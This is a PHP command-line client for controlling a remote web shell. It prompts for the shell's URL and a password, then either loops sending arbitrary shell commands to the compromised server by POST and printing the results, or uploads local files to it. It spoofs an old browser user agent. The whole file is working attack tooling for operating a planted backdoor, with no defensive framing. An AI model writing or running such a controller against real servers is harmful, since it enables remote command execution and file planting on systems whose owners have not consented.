<?php
echo "URL Remoteshell: ";
$inputs = fopen("php://stdin","r");
$input = fgets($inputs);
    $url = trim($input);
fclose($inputs);

print "Password: ";
$inputs = fopen("php://stdin","r");
$input = fgets($inputs);
    $password = trim(md5($input));
    $connect = remoteshell_connect($url,$password,"","test"); 
    if($connect == "suc_1"){
            print "[*] Connecting to ".$url."\n";
            print "[*] Success connect\n";
            print "============[  Type  ]============\n";
            print "[1] Commands Shell mode\n";
            print "[2] Upload file \n";
            print "Type: ";
            $inputs = fopen("php://stdin","r");
            $input = fgets($inputs);
            $type = trim($input);
            if($type == "1"){
                $type = "shell";
                $name = "commands";
                while(1){
                    print "\33[1;31mRemoteShell@$name > \33[1;37m";
                    $inputs = fopen("php://stdin","r");
                    $input = fgets($inputs);
                    $cmd = $input;
                    $connect = remoteshell_connect($url,$password,$cmd,$type); 
                    if($connect){
                        print $connect;
                    }
                    fclose($inputs);
                    
                }
            }
            if($type == "2"){
                $type = "upload";
                $name = "upload";
                while(1){
                    print "\33[1;31mRemoteShell@upload > File: \33[1;37m";
                    $inputs = fopen("php://stdin","r");
                    $input = fgets($inputs);
                    $file = trim($input);
                    if(file_exists($file)){
                    $filebody = file_get_contents($file, "r");
                    remoteshell_connect($url,$password,$cmd,$type, $file, $filebody);
                    print "[*] File uploaded ".$file."\n";
                    }else{
                    print "[!] File not found.\n";
                    }
                }
            }
            
    }else{
        print "[*] Failed to connect, incorrect password\n";
    }
fclose($inputs);

function remoteshell_connect($url, $password, $cmd, $type, $file = "", $body = "") {
    $content = array("password"=>$password, "cmd"=>$cmd, "type"=>$type, "file"=>$file, "file_body"=>$body);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $content);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT,"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}